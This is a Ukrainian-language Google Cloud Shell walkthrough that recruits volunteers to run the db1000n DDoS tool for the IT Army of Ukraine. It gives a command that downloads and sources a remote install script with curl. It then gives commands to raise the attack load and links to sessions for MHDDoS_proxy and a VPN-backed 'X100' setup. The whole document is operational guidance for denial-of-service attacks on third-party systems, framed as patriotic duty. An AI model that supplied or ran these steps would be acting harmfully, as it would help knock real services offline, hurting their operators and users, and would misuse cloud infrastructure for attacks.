
#   Все буде Україна! 💙💛

## Привіт друзі
Бажаю вам чудового настною та гарного дня!

### Запуск «Death by 1000 needles» (db1000n)

- Для початківців пропоную хоча б частково ознайомитись з  інструкцією 👉  [Як запустити «Death by 1000 needles» (db1000n) в Google Cloud Shell](https://telegra.ph/YAk-zapustiti-dvanadcyat-ekzemplyar%D1%96v-Death-by-1000-needles-db1000n-v-Google-Cloud-Shell-ne-vikoristovuyuchi-VPN-05-04)

### ☁️  Cloud Shell  зараз працє в  ефемерному режимі.
  Це означає, що все створене під час цього сеансу видалиться разом з віртуальною машиною  ***після закінчення даного сеансу***.

###  Зверніть увагу   
Якщо з'єднання перервано не підключайтесь вдруге бо вийдете з **ефемерного режиму**. Краще ***завантажтесь знову***, натиснувши кнопку

[![Open in Cloud Shell](https://telegra.ph/file/22b02a59993bd344b2bc9.png)](https://shell.cloud.google.com/cloudshell/open?shellonly=true&tutorial=tutorial.md&git_repo=https://github.com/patatakartata/Cloud_Shell_DDoS&tutorial=tutorial.md)

Щоб перейти до запуску **db1000n** натисніть кнопку **START**

 ## Давайте почнемо
-  Для запуска «Death by 1000 needles» (db1000n) скопіюйте команду розташовану нижче та натисніть клавішу **ENTER**
```bash
cd ~/ && source <(curl https://raw.githubusercontent.com/patatakartata/Cloud_Shell_DDoS/main/install.sh)
```

-   Якщо деякий час все працює без ***роз'єднань***, можна підвищити потужність. Для цього зупиніть процес натиснувши **Ctrl+C** та запустіть команду зі збілшеним навантаженням розташовану нижче
```bash
./db1000n --scale 0.7
```
-   або наступну команду з ще більшим навантаженням
```bash
./db1000n
```
### Щоб переглянути навантаження на процесор використаємо команду **htop**
-   Додайте ще один термінал натиснувши "**+**" праворуч від заголовка працюючого терміналу, та виконайте наступну команду
```bash
htop -F ./db
```

## **Пропоную для ознайомлення:**

* Натисніть на кнопку щоб завантажити новий сеанс Google Cloud Shell з інструкцією по запуску **MHDDoS_proxy**.

[![Open in Cloud Shell](https://telegra.ph/file/22b02a59993bd344b2bc9.png)](https://shell.cloud.google.com/cloudshell/open?shellonly=true&tutorial=mhddos_proxy_tutorial.md&git_repo=https://github.com/patatakartata/Cloud_Shell_DDoS&tutorial=mhddos_proxy_tutorial.md)

* Інструкція для початківців   
 👉 [Як запустити «Death by 1000 needles» (db1000n) в Google Cloud Shell](https://telegra.ph/YAk-zapustiti-dvanadcyat-ekzemplyar%D1%96v-Death-by-1000-needles-db1000n-v-Google-Cloud-Shell-ne-vikoristovuyuchi-VPN-05-04)
* Інструкція для більш досвідчених   
 👉 [Як запустити потужний Db1000nX100 з використанням VPN в Google Cloud Shell](https://telegra.ph/Zapusk-Db1000nX100-u-Google-Cloud-Shell-05-20)
* Офіційна сторінка   [⚡ It Army of Ukraine ⚡](https://itarmy.com.ua/)  має багато корисної інформації   

##  **Все буде Україна! 💙💛**

<walkthrough-conclusion-trophy>
</walkthrough-conclusion-trophy>
Натиснувши кнопку FINISH довідка закриєця і ви перейдете до головного меню довідника Google Cloud Shell.   
Кнопка PREVIOUS поверне вас на попередню сторінку.

<walkthrough-footnote>Звертайтесь patatakartata@gmail.com або @patatakartata</walkthrough-footnote>
